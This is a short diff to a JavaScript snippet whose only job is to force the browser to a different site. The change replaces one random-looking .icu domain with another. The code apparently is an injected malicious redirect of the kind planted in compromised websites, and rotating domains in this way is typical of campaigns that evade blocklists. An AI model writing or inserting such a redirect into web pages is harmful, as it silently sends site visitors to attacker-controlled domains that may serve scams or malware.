@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://we.w7ats2pp.icu/';
+    window['location'] = 'https://lvsidjeraz.icu/';
 })();
